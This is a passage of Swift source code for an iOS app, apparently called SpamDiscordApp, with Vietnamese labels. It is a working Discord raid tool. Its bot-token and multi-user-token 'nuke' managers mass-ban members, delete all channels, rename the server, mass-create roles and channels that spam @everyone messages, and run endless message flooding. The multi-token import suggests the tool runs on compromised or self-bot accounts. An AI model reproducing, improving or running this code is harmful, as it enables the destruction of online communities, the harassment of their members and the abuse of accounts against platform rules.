            Task { await loadGuilds() }
        }
    }
    func setToken(_ s: String) async {
        let clean = s.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !clean.isEmpty else { return }
        isCheckingToken = true; tokenError = nil
        do {
            let info = try await BotClient(token: clean).validate()
            guard info.bot == true else {
                tokenError = "Token này không phải Bot token"
                isCheckingToken = false
                return
            }
            let raw = clean.replacingOccurrences(of: "Bot ", with: "", options: .caseInsensitive)
            config = BotConfig(token: raw, username: info.username, userId: info.id,
                               avatarHash: info.avatar, discriminator: info.discriminator)
            await loadGuilds()
        } catch { tokenError = "Lỗi: \(error.localizedDescription)" }
        isCheckingToken = false
    }
    func removeConfig() { config = nil; botGuilds = []; nukeLog = [] }
    func loadGuilds() async {
        guard let c = client else { return }
        isLoadingGuilds = true
        do { botGuilds = try await c.getGuilds().sorted { $0.name < $1.name }; tokenError = nil }
        catch { tokenError = error.localizedDescription }
        isLoadingGuilds = false
    }
    func stopNuke() { isCancelled = true }
    private func log(_ m: String) { nukeLog.append(m); if nukeLog.count > 800 { nukeLog.removeFirst(nukeLog.count - 800) } }
    private func reset() { banSuccess = 0; banFailed = 0; channelsDeleted = 0; channelsCreated = 0; messagesSent = 0; rolesCreated = 0; phaseProgress = 0 }

    func runNuke(guild: Guild, options: NukeConfig) async {
        guard let c = client else { return }
        isNuking = true; isCancelled = false; nukeLog = []; reset()
        BackgroundManager.shared.start()
        let gid = guild.id
        log("Bắt đầu nuke: \(guild.name)")

        if options.doMassBan {
            currentPhase = "Mass Ban"; phaseProgress = 0.1
            log("Mass Ban...")
            await doMassBan(c, gid)
        }
        if options.doDeleteChannels && !isCancelled {
            currentPhase = "Xóa kênh"; phaseProgress = 0.35
            log("Xóa kênh...")
            await doDeleteChannels(c, gid)
        }
        if options.doRenameGuild && !options.newGuildName.isEmpty && !isCancelled {
            currentPhase = "Đổi tên"; phaseProgress = 0.5
            log("Đổi tên server...")
            do { try await c.renameGuild(gid, newName: options.newGuildName); log("[OK] Đã đổi tên") }
            catch { log("[LỖI] \(error.localizedDescription)") }
        }
        if !isCancelled && (options.doCreateRoles || options.doCreateChannels) {
            currentPhase = "Tạo Role + Kênh"; phaseProgress = 0.7
            log("Tạo Role + Kênh...")
            if options.doCreateRoles && options.doCreateChannels {
                async let r = doCreateRoles(c, gid, options: options)
                async let ch = doCreateChannels(c, gid, options: options)
                let (rr, cc) = await (r, ch)
                rolesCreated = rr; channelsCreated = cc.0; messagesSent = cc.1
            } else if options.doCreateRoles {
                rolesCreated = await doCreateRoles(c, gid, options: options)
            } else {
                let cc = await doCreateChannels(c, gid, options: options)
                channelsCreated = cc.0; messagesSent = cc.1
            }
            log("[OK] Role: \(rolesCreated) | Kênh: \(channelsCreated) | Tin: \(messagesSent)")
        }
        currentPhase = isCancelled ? "Đã dừng" : "Hoàn tất"
        phaseProgress = 1.0
        log(isCancelled ? "Đã dừng" : "HOÀN TẤT")
        isNuking = false
        BackgroundManager.shared.stop()
    }

    private func doMassBan(_ c: BotClient, _ gid: String) async {
        guard let cfg = config else { return }
        do {
            let detail = try await c.getGuildDetail(gid)
            let ownerId = detail["owner_id"] as? String
            let botMember = try await c.getMember(gid, userId: cfg.userId)
            let roles = try await c.getRoles(gid)
            let map = Dictionary(uniqueKeysWithValues: roles.map { ($0.id, $0) })
            let botMax = (botMember.roles ?? []).compactMap { map[$0]?.position }.max() ?? 0
            log("Bot role position: \(botMax)")
            guard botMax > 0 else { log("Cảnh báo: bot role quá thấp"); return }
            var after = "0"
            while !isCancelled {
                let members: [BotMember]
                do { members = try await c.getMembers(gid, after: after) }
                catch {
                    log("[LỖI] \(error.localizedDescription)")
                    if error.localizedDescription.contains("403") {
                        log("Gợi ý: bật SERVER MEMBERS INTENT tại Developer Portal")
                    }
                    return
                }
                if members.isEmpty { break }
                for m in members {
                    if isCancelled { break }
                    guard let uid = m.user?.id else { continue }
                    if uid == cfg.userId || uid == ownerId || m.user?.bot == true { continue }
                    let pos = (m.roles ?? []).compactMap { map[$0]?.position }.max() ?? 0
                    if pos >= botMax { continue }
                    do { try await c.banMember(gid, userId: uid); banSuccess += 1 }
                    catch { banFailed += 1 }
                    if (banSuccess + banFailed) % 10 == 0 { log("Ban: \(banSuccess) ok / \(banFailed) fail") }
                }
                if members.count < 1000 { break }
                after = members.last?.user?.id ?? after
                try? await Task.sleep(nanoseconds: 500_000_000)
            }
            log("[OK] Ban: \(banSuccess) ok / \(banFailed) fail")
        } catch { log("[LỖI] \(error.localizedDescription)") }
    }

    private func doDeleteChannels(_ c: BotClient, _ gid: String) async {
        do {
            let chans = try await c.getChannels(gid)
            log("Tìm \(chans.count) kênh")
            var n = 0
            await withTaskGroup(of: Bool.self) { group in
                var inf = 0
                for ch in chans {
                    if isCancelled { break }
                    group.addTask { do { try await c.deleteChannel(ch.id); return true } catch { return false } }
                    inf += 1
                    if inf >= 10 { if let r = await group.next(), r { n += 1 }; inf -= 1 }
                }
                for await r in group { if r { n += 1 } }
            }
            channelsDeleted = n
            log("[OK] Đã xóa \(n)")
        } catch { log("[LỖI] \(error.localizedDescription)") }
    }
    private func doCreateRoles(_ c: BotClient, _ gid: String, options: NukeConfig) async -> Int {
        var n = 0
        await withTaskGroup(of: Bool.self) { group in
            var inf = 0
            for _ in 0..<options.roleCount {
                if isCancelled { break }
                group.addTask { do { try await c.createRole(gid, name: options.roleName); return true } catch { return false } }
                inf += 1
                if inf >= 10 { if let r = await group.next(), r { n += 1 }; inf -= 1 }
            }
            for await r in group { if r { n += 1 } }
        }
        return n
    }
    private func doCreateChannels(_ c: BotClient, _ gid: String, options: NukeConfig) async -> (Int, Int) {
        var cr = 0, se = 0
        var content = options.messageContent
        if options.tagEveryone && !content.contains("@everyone") { content += "\n\n@everyone" }
        await withTaskGroup(of: (Bool, Bool).self) { group in
            var inf = 0
            for _ in 0..<options.channelCount {
                if isCancelled { break }
                group.addTask {
                    do {
                        guard let ch = try await c.createChannel(gid, name: options.channelName, openEveryone: true) else { return (false, false) }
                        if !content.trimmingCharacters(in: .whitespaces).isEmpty {
                            do { try await c.sendMessage(ch, content: content); return (true, true) }
                            catch { return (true, false) }
                        }
                        return (true, false)
                    } catch { return (false, false) }
                }
                inf += 1
                if inf >= 8 {
                    if let (a, b) = await group.next() { if a { cr += 1 }; if b { se += 1 } }
                    inf -= 1
                }
            }
            for await (a, b) in group { if a { cr += 1 }; if b { se += 1 } }
        }
        return (cr, se)
    }
}

// ==========================================
// MARK: - USER NUKE MANAGER — storage key: "UserNukeTokensV2"
// ==========================================
@MainActor
class UserNukeManager: ObservableObject {
    @Published var tokens: [TokenInfo] = [] { didSet { saveTokens() } }
    @Published var selectedTokenIds: Set<UUID> = []
    @Published var isImporting = false
    @Published var importError: String?
    @Published var tokenGuilds: [UUID: [NukeGuild]] = [:]
    @Published var eligibleGuilds: [Guild] = []
    @Published var isLoadingGuilds = false
    @Published var isNuking = false
    @Published var nukeLog: [String] = []
    @Published var banSuccess = 0
    @Published var banFailed = 0
    @Published var channelsDeleted = 0
    @Published var channelsCreated = 0
    @Published var messagesSent = 0
    @Published var rolesCreated = 0
    @Published var currentPhase = ""
    @Published var phaseProgress: Double = 0
    @Published var membersScanned = 0

    private var isCancelled = false
    private let key = "UserNukeTokensV2"

    init() { migrateIfNeeded(); loadTokens() }

    private func migrateIfNeeded() {
        if UserDefaults.standard.data(forKey: key) == nil,
           let old = UserDefaults.standard.data(forKey: "UserNukeTokensV1") {
            UserDefaults.standard.set(old, forKey: key)
        }
    }
    private func saveTokens() {
        if let d = try? JSONEncoder().encode(tokens) { UserDefaults.standard.set(d, forKey: key) }
    }
    private func loadTokens() {
        if let d = UserDefaults.standard.data(forKey: key),
           let s = try? JSONDecoder().decode([TokenInfo].self, from: d) {
            tokens = s
        }
    }

    func importFromFile(url: URL) async {
        let got = url.startAccessingSecurityScopedResource()
        defer { if got { url.stopAccessingSecurityScopedResource() } }
        try? FileManager.default.startDownloadingUbiquitousItem(at: url)
        var data: Data?
        let coord = NSFileCoordinator()
        var err: NSError?
        coord.coordinate(readingItemAt: url, options: [], error: &err) { u in data = try? Data(contentsOf: u) }
        if data == nil { data = try? Data(contentsOf: url) }
        guard let d = data else { importError = "Không đọc được file"; return }
        var text: String?
        for enc in [String.Encoding.utf8, .utf16, .utf16LittleEndian, .utf16BigEndian, .windowsCP1252, .isoLatin1, .ascii] {
            if let s = String(data: d, encoding: enc), !s.isEmpty { text = s; break }
        }
        if text == nil { text = String(decoding: d, as: UTF8.self) }
        guard let t = text else { importError = "File rỗng"; return }
        let clean = t.replacingOccurrences(of: "\u{FEFF}", with: "")
        let lines = clean.components(separatedBy: .newlines).map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }.filter { !$0.isEmpty }
        guard !lines.isEmpty else { importError = "File không có token"; return }
        isImporting = true; importError = nil
        for line in lines {
            if tokens.contains(where: { $0.token == line }) { continue }
            do {
                let u = try await UserNukeClient(token: line).validate()
                tokens.append(TokenInfo(token: line, userId: u.id, username: u.globalName ?? u.username,
                                        avatarHash: u.avatar, isValid: true))
            } catch {
                tokens.append(TokenInfo(token: line, userId: "0", username: "Token chết", avatarHash: nil, isValid: false))
            }
        }
        isImporting = false
    }

    func removeToken(_ id: UUID) {
        tokens.removeAll { $0.id == id }
        selectedTokenIds.remove(id)
        tokenGuilds.removeValue(forKey: id)
        recomputeEligible()
    }
    func clearAll() {
        tokens = []
        selectedTokenIds = []
        tokenGuilds = [:]
        eligibleGuilds = []
    }
    func toggleSelection(_ t: TokenInfo) {
        guard t.isValid else { return }
        if selectedTokenIds.contains(t.id) { selectedTokenIds.remove(t.id) }
        else { selectedTokenIds.insert(t.id) }
        recomputeEligible()
        if !tokenGuilds.keys.contains(t.id) { Task { await loadGuildsForToken(t) } }
    }
    func loadAllGuildsForSelected() async {
        isLoadingGuilds = true
        for id in selectedTokenIds {
            guard let t = tokens.first(where: { $0.id == id }), t.isValid else { continue }
            await loadGuildsForToken(t)
        }
        recomputeEligible()
        isLoadingGuilds = false
    }
    private func loadGuildsForToken(_ t: TokenInfo) async {
        do { tokenGuilds[t.id] = try await UserNukeClient(token: t.token).getGuildsWithPerms() }
        catch { tokenGuilds[t.id] = [] }
        recomputeEligible()
    }
    func recomputeEligible() {
        guard !selectedTokenIds.isEmpty else { eligibleGuilds = []; return }
        var set: Set<String>? = nil
        var first: [NukeGuild]? = nil
        for id in selectedTokenIds {
            guard let guilds = tokenGuilds[id] else { eligibleGuilds = []; return }
            let n = guilds.filter { $0.canNuke }
            let ids = Set(n.map { $0.id })
            if set == nil { set = ids; first = n }
            else { set = set!.intersection(ids) }
        }
        guard let s = set, let list = first else { eligibleGuilds = []; return }
        eligibleGuilds = list.filter { s.contains($0.id) }
            .map { Guild(id: $0.id, name: $0.name, icon: $0.icon) }
            .sorted { $0.name < $1.name }
    }

    func stop() { isCancelled = true }
    private func log(_ m: String) { nukeLog.append(m); if nukeLog.count > 800 { nukeLog.removeFirst(nukeLog.count - 800) } }
    private func reset() { banSuccess = 0; banFailed = 0; channelsDeleted = 0; channelsCreated = 0; messagesSent = 0; rolesCreated = 0; membersScanned = 0; phaseProgress = 0 }

    func runNuke(guild: Guild, options: NukeConfig) async {
        let sel = tokens.filter { selectedTokenIds.contains($0.id) && $0.isValid }
        guard !sel.isEmpty else { return }
        isNuking = true; isCancelled = false; nukeLog = []; reset()
        BackgroundManager.shared.start()
        let gid = guild.id
        let clients = sel.map { UserNukeClient(token: $0.token) }
        log("Bắt đầu nuke: \(guild.name)")
        log("Dùng \(clients.count) token")

        if options.doMassBan {
            currentPhase = "Mass Ban"; phaseProgress = 0.1
            log("Mass Ban...")
            await doMassBanScan(clients[0], clients: clients, gid: gid, roleId: options.banRoleId)
        }
        if options.doDeleteChannels && !isCancelled {
            currentPhase = "Xóa kênh"; phaseProgress = 0.4
            log("Xóa kênh...")
            await doDeleteChannels(clients, gid)
        }
        if options.doRenameGuild && !options.newGuildName.isEmpty && !isCancelled {
            currentPhase = "Đổi tên"; phaseProgress = 0.55
            log("Đổi tên server...")
            do { try await clients[0].renameGuild(gid, newName: options.newGuildName); log("[OK] Đổi tên") }
            catch { log("[LỖI] \(error.localizedDescription)") }
        }
        if !isCancelled && (options.doCreateRoles || options.doCreateChannels) {
            currentPhase = "Tạo Role + Kênh"; phaseProgress = 0.75
            log("Tạo Role + Kênh song song...")
            if options.doCreateRoles && options.doCreateChannels {
                async let r = doCreateRoles(clients, gid, options)
                async let ch = doCreateChannels(clients, gid, options)
                let (rr, cc) = await (r, ch)
                rolesCreated = rr; channelsCreated = cc.0; messagesSent = cc.1
            } else if options.doCreateRoles {
                rolesCreated = await doCreateRoles(clients, gid, options)
            } else {
                let cc = await doCreateChannels(clients, gid, options)
                channelsCreated = cc.0; messagesSent = cc.1
            }
            log("[OK] Role: \(rolesCreated) | Kênh: \(channelsCreated) | Tin: \(messagesSent)")
        }
        currentPhase = isCancelled ? "Đã dừng" : "Hoàn tất"
        phaseProgress = 1.0
        log(isCancelled ? "Đã dừng" : "HOÀN TẤT")
        isNuking = false
        BackgroundManager.shared.stop()
    }

    private func doMassBanScan(_ scan: UserNukeClient, clients: [UserNukeClient], gid: String, roleId: String) async {
        do {
            let roles = try await scan.getRoles(gid)
            let map = Dictionary(uniqueKeysWithValues: roles.map { ($0.id, $0) })
            let detail = try await scan.getGuildDetail(gid)
            let ownerId = detail["owner_id"] as? String
            let me = try await scan.validate()
            let myMember = try await scan.getMember(gid, uid: me.id)
            let myMax = (myMember.roles ?? []).compactMap { map[$0]?.position }.max() ?? 0
            log("Scan token role position: \(myMax)")

            var rolePos = 0
            var filterRole = false
            if !roleId.isEmpty, let tr = map[roleId] {
                rolePos = tr.position; filterRole = true
                log("Ban theo role: \(tr.name) (pos \(rolePos))")
            }

            var candidates: [String] = []
            let lock = NSLock()
            let process: ([String: Any]) -> Void = { m in
                guard let u = m["user"] as? [String: Any], let uid = u["id"] as? String else { return }
                if uid == me.id || uid == ownerId { return }
                if (u["bot"] as? Bool) == true { return }
                let mRoles = m["roles"] as? [String] ?? []
                let mMax = mRoles.compactMap { map[$0]?.position }.max() ?? 0
                if mMax >= myMax { return }
                if filterRole {
                    if !mRoles.contains(roleId) { return }
                    if mRoles.compactMap({ map[$0]?.position }).contains(where: { $0 > rolePos }) { return }
                }
                lock.lock(); candidates.append(uid); let n = candidates.count; lock.unlock()
                if n % 5 == 0 { Task { @MainActor in self.membersScanned = n } }
            }

            log("Đang quét member qua WebSocket...")
            do {
                try await scan.fetchMembersWS(guildId: gid, onMember: process,
                                              onProgress: { c in Task { @MainActor in self.membersScanned = c } })
            } catch {
                log("[LỖI] WS: \(error.localizedDescription) — thử HTTP")
                await scan.fetchMembersHTTP(guildId: gid, onMember: process,
                                            onProgress: { c in Task { @MainActor in self.membersScanned = c } })
            }
            log("Tìm thấy \(candidates.count) target")
            guard !candidates.isEmpty else { log("Không có ai để ban"); return }

            let queue = candidates
            let idx = IndexBox()
            await withTaskGroup(of: Void.self) { group in
                for c in clients {
                    group.addTask {
                        while !self.isCancelled {
                            let i = idx.next()
                            if i >= queue.count { break }
                            let uid = queue[i]
                            do {
                                try await c.banMember(gid, uid: uid)
                                await MainActor.run { self.banSuccess += 1 }
                            } catch {
                                await MainActor.run { self.banFailed += 1 }
                            }
                        }
                    }
                }
            }
            log("[OK] Ban: \(banSuccess) ok / \(banFailed) fail")
        } catch { log("[LỖI] \(error.localizedDescription)") }
    }

    private func doDeleteChannels(_ clients: [UserNukeClient], _ gid: String) async {
        do {
            let chans = try await clients[0].getChannels(gid)
            log("Tìm \(chans.count) kênh")
            let idx = IndexBox(); var n = 0
            await withTaskGroup(of: Bool.self) { group in
                var inf = 0
                for _ in 0..<chans.count {
                    if isCancelled { break }
                    let c = clients[Int.random(in: 0..<clients.count)]
                    let i = idx.next()
                    if i >= chans.count { break }
                    let ch = chans[i]
                    group.addTask { do { try await c.deleteChannel(ch.id); return true } catch { return false } }
                    inf += 1
                    if inf >= 10 { if let r = await group.next(), r { n += 1 }; inf -= 1 }
                }
                for await r in group { if r { n += 1 } }
            }
            channelsDeleted = n
            log("[OK] Đã xóa \(n)")
        } catch { log("[LỖI] \(error.localizedDescription)") }
    }
    private func doCreateRoles(_ clients: [UserNukeClient], _ gid: String, _ opts: NukeConfig) async -> Int {
        var n = 0
        await withTaskGroup(of: Bool.self) { group in
            var inf = 0
            for _ in 0..<opts.roleCount {
                if isCancelled { break }
                let c = clients[Int.random(in: 0..<clients.count)]
                group.addTask { do { try await c.createRole(gid, name: opts.roleName); return true } catch { return false } }
                inf += 1
                if inf >= 10 { if let r = await group.next(), r { n += 1 }; inf -= 1 }
            }
            for await r in group { if r { n += 1 } }
        }
        return n
    }
    private func doCreateChannels(_ clients: [UserNukeClient], _ gid: String, _ opts: NukeConfig) async -> (Int, Int) {
        var cr = 0, se = 0
        var content = opts.messageContent
        if opts.tagEveryone && !content.contains("@everyone") { content += "\n\n@everyone" }
        await withTaskGroup(of: (Bool, Bool).self) { group in
            var inf = 0
            for _ in 0..<opts.channelCount {
                if isCancelled { break }
                let c = clients[Int.random(in: 0..<clients.count)]
                group.addTask {
                    do {
                        guard let ch = try await c.createChannel(gid, name: opts.channelName, openEveryone: true) else { return (false, false) }
                        if !content.trimmingCharacters(in: .whitespaces).isEmpty {
                            do { try await c.sendMessage(ch, content: content); return (true, true) }
                            catch { return (true, false) }
                        }
                        return (true, false)
                    } catch { return (false, false) }
                }
                inf += 1
                if inf >= 8 {
                    if let (a, b) = await group.next() { if a { cr += 1 }; if b { se += 1 } }
                    inf -= 1
                }
            }
            for await (a, b) in group { if a { cr += 1 }; if b { se += 1 } }
        }
        return (cr, se)
    }
}

final class IndexBox: @unchecked Sendable {
    private var value = 0
    private let lock = NSLock()
    func next() -> Int { lock.lock(); defer { lock.unlock() }; let v = value; value += 1; return v }
}

// ==========================================
// MARK: - APP ENTRY POINT
// ==========================================
@main
struct SpamDiscordApp: App {
    @StateObject private var app = AppState()
    @StateObject private var bot = BotManager()
    @StateObject private var userNuke = UserNukeManager()
    var body: some Scene {
        WindowGroup {
            MainTabView()
                .environmentObject(app)
                .environmentObject(bot)
                .environmentObject(userNuke)
        }
    }
}

struct MainTabView: View {
    var body: some View {
        TabView {
            SpamView().tabItem { Text("Spam") }
            TokenListView().tabItem { Text("Tokens") }
            NukeTabView().tabItem { Text("Nuke") }
        }
        .tint(.indigo)
    }
}

struct NukeTabView: View {
    @State private var mode: Mode = .bot
    enum Mode { case bot, user }
    var body: some View {
        VStack(spacing: 0) {
            Picker("", selection: $mode) {
                Text("Bot").tag(Mode.bot)
                Text("User Token").tag(Mode.user)
            }
            .pickerStyle(.segmented)
            .padding(.horizontal).padding(.top, 8).padding(.bottom, 4)

            if mode == .bot { BotNukeView() } else { UserNukeView() }
        }
    }
}

// ==========================================
// MARK: - EMPTY STATE
// ==========================================
struct EmptyStateView: View {
    let title: String
    let description: String
    var body: some View {
        VStack(spacing: 12) {
            Text(title).font(.title2.bold())
            Text(description).font(.subheadline).foregroundStyle(.secondary)
                .multilineTextAlignment(.center).padding(.horizontal)
        }
        .frame(maxWidth: .infinity, maxHeight: .infinity)
        .background(Color(UIColor.systemGroupedBackground))
    }
}

// Avatar view (không dùng SF Symbol)
struct AvatarView: View {
    let url: URL?
    let initial: String
    let size: CGFloat
    var body: some View {
        if let url = url {
            AsyncImage(url: url) { img in img.resizable().scaledToFill() }
            placeholder: {
                Circle().fill(Color.indigo.opacity(0.15))
                    .overlay(Text(initial).font(.headline).foregroundStyle(.indigo))
            }
            .frame(width: size, height: size).clipShape(Circle())
        } else {
            Circle().fill(Color.indigo.opacity(0.15))
                .overlay(Text(initial).font(.headline).foregroundStyle(.indigo))
                .frame(width: size, height: size)
        }
    }
}

// ==========================================
// MARK: - TOKEN VIEWS (spam)
// ==========================================
struct TokenListView: View {
    @EnvironmentObject var app: AppState
    @State private var showAddSheet = false
    @State private var showImport = false

    var body: some View {
        NavigationStack {
            Group {
                if app.tokens.isEmpty {
                    EmptyStateView(title: "Chưa có Token", description: "Thêm token để sử dụng app.")
                } else {
                    List {
                        Section(header: Text("Danh sách")) {
                            ForEach(app.tokens) { token in
                                Button { app.setActiveToken(token) } label: {
                                    HStack(spacing: 12) {
                                        AvatarView(url: token.avatarURL, initial: token.initial, size: 45)
                                        VStack(alignment: .leading, spacing: 4) {
                                            Text(token.username).font(.headline)
                                            Text(token.isValid ? "Live" : "Die").font(.caption).bold()
                                                .foregroundStyle(token.isValid ? .green : .red)
                                        }
                                        Spacer()
                                        if app.activeToken?.id == token.id {
                                            Text("ĐANG DÙNG")
                                                .font(.caption2.bold()).foregroundStyle(.indigo)
                                                .padding(.horizontal, 8).padding(.vertical, 3)
                                                .background(Color.indigo.opacity(0.15)).cornerRadius(4)
                                        }
                                    }.padding(.vertical, 4)
                                }
                                .buttonStyle(.plain)
                                .disabled(!token.isValid)
                            }
                            .onDelete(perform: app.deleteToken)
                        }
                    }
                }
            }
            .navigationTitle("Quản lý Token")
            .toolbar {
                ToolbarItem(placement: .topBarTrailing) {
                    Menu {
                        Button("Thêm bằng tay") { showAddSheet = true }
                        Button("Nhập từ file") { showImport = true }
                    } label: { Text("Thêm").bold() }
                }
            }
            .sheet(isPresented: $showAddSheet) { AddTokenSheet() }
            .sheet(isPresented: $showImport) {
                DocumentPicker(contentTypes: [.item]) { url in
                    Task { await app.addTokensFromFile(url: url) }
                }
            }
            .overlay {
                if app.isCheckingToken {
                    ProgressView("Đang check...").padding()
                        .background(.ultraThinMaterial, in: RoundedRectangle(cornerRadius: 12))
                }
            }
        }
    }
}

struct AddTokenSheet: View {
    @EnvironmentObject var app: AppState
    @Environment(\.dismiss) var dismiss
    @State private var tokenInput = ""

    var body: some View {
        NavigationStack {
            Form {
                Section(header: Text("Nhập Token")) {
                    TextField("Dán token...", text: $tokenInput)
                        .autocorrectionDisabled().textInputAutocapitalization(.never)
                }
            }
            .navigationTitle("Thêm Token").navigationBarTitleDisplayMode(.inline)
            .toolbar {
                ToolbarItem(placement: .cancellationAction) { Button("Huỷ") { dismiss() } }
                ToolbarItem(placement: .confirmationAction) {
                    Button("Lưu") { Task { await app.addToken(tokenInput); dismiss() } }
                        .disabled(tokenInput.isEmpty || app.isCheckingToken)
                }
            }
        }
    }
}

// ==========================================
// MARK: - SPAM VIEWS
// ==========================================
struct SpamView: View {
    @EnvironmentObject var app: AppState
    @State private var searchText = ""

    var filtered: [Guild] {
        searchText.isEmpty ? app.guilds : app.guilds.filter { $0.name.localizedCaseInsensitiveContains(searchText) }
    }
    var body: some View {
        NavigationStack {
            Group {
                if app.activeToken == nil {
                    EmptyStateView(title: "Chưa chọn Token", description: "Vào tab Tokens để thêm và chọn.")
                } else if app.isLoading {
                    ProgressView("Đang tải...")
                } else {
                    List(filtered) { g in
                        NavigationLink(value: g) {
                            HStack(spacing: 12) {
                                if let icon = g.icon,
                                   let url = URL(string: "https://cdn.discordapp.com/icons/\(g.id)/\(icon).png?size=64") {
                                    AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                                    placeholder: { Circle().fill(.gray.opacity(0.3)) }
                                        .frame(width: 35, height: 35).clipShape(Circle())
                                } else {
                                    Circle().fill(Color.secondary.opacity(0.2))
                                        .overlay(Text(String(g.name.prefix(1)).uppercased())
                                                    .font(.caption.bold()).foregroundStyle(.secondary))
                                        .frame(width: 35, height: 35)
                                }
                                Text(g.name).fontWeight(.medium)
                            }
                        }
                    }.searchable(text: $searchText, prompt: "Tìm Server...")
                }
            }
            .navigationTitle("Chọn Server")
            .navigationDestination(for: Guild.self) { ChannelListView(guild: $0) }
            .refreshable { await app.loadGuilds() }
        }
    }
}

struct ChannelListView: View {
    @EnvironmentObject var app: AppState
    let guild: Guild
    @State private var searchText = ""

    var filteredSections: [(category: Channel?, items: [Channel])] {
        let s = app.groupedChannels()
        if searchText.isEmpty { return s }
        return s.compactMap { sec in
            let items = sec.items.filter { $0.displayName.localizedCaseInsensitiveContains(searchText) }
            return items.isEmpty ? nil : (sec.category, items)
        }
    }

    var body: some View {
        Group {
            if app.isLoading { ProgressView() }
            else {
                List {
                    ForEach(filteredSections, id: \.category?.id) { sec in
                        Section(header: Text(sec.category?.displayName.uppercased() ?? "KHÁC").font(.caption).bold()) {
                            ForEach(sec.items) { c in
                                NavigationLink(value: c) {
                                    HStack(spacing: 8) {
                                        Text(c.type == 5 ? "[LOA]" : "#").foregroundStyle(.secondary).font(.caption.bold())
                                        Text(c.displayName)
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        .searchable(text: $searchText, prompt: "Tìm kênh...")
        .navigationTitle(guild.name)
        .task { await app.loadChannels(for: guild) }
        .navigationDestination(for: Channel.self) { SendView(channel: $0) }
    }
}

struct SendView: View {
    @EnvironmentObject var app: AppState
    let channel: Channel
    @State private var showImport = false
    @State private var showErrorAlert = false

    var body: some View {
        ScrollView {
            VStack(spacing: 16) {
                HStack {
                    Text("#").font(.title.bold()).foregroundStyle(.indigo)
                    Text(channel.displayName).font(.title2.bold())
                    Spacer()
                }
                .padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)

                VStack(alignment: .leading, spacing: 12) {
                    Text("CẤU HÌNH").font(.caption).bold().foregroundStyle(.secondary)
                    Toggle("Tag User ID", isOn: $app.useTag).tint(.indigo)
                    if app.useTag {
                        TextField("Nhập User ID", text: $app.targetUserId)
                            .keyboardType(.numberPad).padding(10)
                            .background(Color(UIColor.tertiarySystemBackground)).cornerRadius(8)
                    }
                    HStack {
                        Toggle("Thêm '>'", isOn: $app.addPrefix).tint(.indigo)
                        Toggle("Thêm '#'", isOn: $app.addSuffix).tint(.indigo)
                    }
                    VStack(alignment: .leading, spacing: 8) {
                        HStack {
                            Text("Delay:")
                            Spacer()
                            Text("\(String(format: "%.1f", app.delaySeconds))s").bold()
                                .foregroundStyle(app.delaySeconds < 1.0 ? .red : .indigo)
                        }
                        Slider(value: $app.delaySeconds, in: 0.1...5.0, step: 0.1).tint(.indigo)
                    }
                }
                .padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)

                VStack(alignment: .leading, spacing: 10) {
                    HStack {
                        Text("NỘI DUNG TIN NHẮN").font(.caption).bold().foregroundStyle(.secondary)
                        Spacer()
                        Button(action: { showImport = true }) {
                            Text("Import").font(.caption.bold())
                        }
                    }
                    ZStack(alignment: .topTrailing) {
                        TextEditor(text: $app.inputText)
                            .frame(height: 100)
                            .padding(8)
                            .background(Color(UIColor.tertiarySystemBackground))
                            .cornerRadius(10)
                            .onChange(of: app.inputText) { _ in app.parseDirectInput() }

                        if !app.inputText.isEmpty {
                            Button(action: { app.inputText = ""; app.parseDirectInput() }) {
                                Text("X").font(.caption.bold()).foregroundStyle(.secondary)
                                    .padding(8).background(Color(UIColor.tertiarySystemBackground))
                                    .clipShape(Circle()).padding(8)
                            }
                        }
                    }
                    if !app.messages.isEmpty {
                        Text("Đã nhận diện: \(app.messages.count) dòng")
                            .font(.caption).foregroundStyle(.green)
                    }
                }
                .padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)

                if app.isSending {
                    VStack(spacing: 12) {
                        ProgressView().scaleEffect(1.3).tint(.indigo).padding(.top)
                        Text("Đang gửi vô hạn...").font(.headline)
                        Text("Tổng đã gửi: \(app.totalSent)").font(.subheadline).foregroundStyle(.secondary)
                        Text(app.currentMessageStr).font(.caption).foregroundStyle(.gray)
                            .lineLimit(2).multilineTextAlignment(.center).padding(.horizontal)
                        if let e = app.lastError { Text(e).font(.caption).foregroundStyle(.red) }
                        Button(action: { app.stopSending() }) {
                            Text("DỪNG LẠI").bold().frame(maxWidth: .infinity).padding()
                        }.background(Color.red).foregroundStyle(.white).cornerRadius(12)
                    }.padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)
                } else {
                    Button(action: { app.startSending(channel: channel) }) {
                        Text("BẮT ĐẦU GỬI").bold().frame(maxWidth: .infinity).padding()
                    }
                    .background(Color.indigo).foregroundStyle(.white).cornerRadius(12)
                    .disabled(app.messages.isEmpty || (app.useTag && app.targetUserId.isEmpty))
                    .opacity((app.messages.isEmpty || (app.useTag && app.targetUserId.isEmpty)) ? 0.5 : 1.0)
                }
            }.padding()
        }
        .background(Color(UIColor.systemGroupedBackground))
        .navigationTitle("Gửi tin nhắn").navigationBarTitleDisplayMode(.inline)
        .toolbar {
            ToolbarItemGroup(placement: .keyboard) {
                Spacer(); Button("Xong") { app.hideKeyboard() }
            }
        }
        .sheet(isPresented: $showImport) {
            DocumentPicker(contentTypes: [.item]) { url in
                app.parseFile(url: url)
                if app.lastError != nil { showErrorAlert = true }
            }
        }
        .alert("Lỗi Import", isPresented: $showErrorAlert) {
            Button("OK", role: .cancel) {}
        } message: { Text(app.lastError ?? "Lỗi") }
    }
}

// ==========================================
// MARK: - BOT NUKE VIEWS
// ==========================================
struct BotNukeView: View {
    @EnvironmentObject var bot: BotManager
    @State private var selectedGuild: Guild?

    var body: some View {
        NavigationStack {
            Group {
                if bot.config == nil { BotSetupView() }
                else if bot.isNuking { BotNukeRunningView() }
                else if let g = selectedGuild { NukeOptionsView(guild: g, selectedGuild: $selectedGuild, mode: .bot) }
                else { BotGuildListView(selectedGuild: $selectedGuild) }
            }
            .navigationTitle(navTitle).navigationBarTitleDisplayMode(.inline)
        }
    }
    private var navTitle: String {
        if bot.config == nil { return "Bot Nuke" }
        if bot.isNuking { return "Đang chạy..." }
        if let g = selectedGuild { return g.name }
        return "Bot — Chọn Server"
    }
}

struct BotSetupView: View {
    @EnvironmentObject var bot: BotManager
    @State private var tokenInput = ""

    var body: some View {
        ScrollView {
            VStack(spacing: 20) {
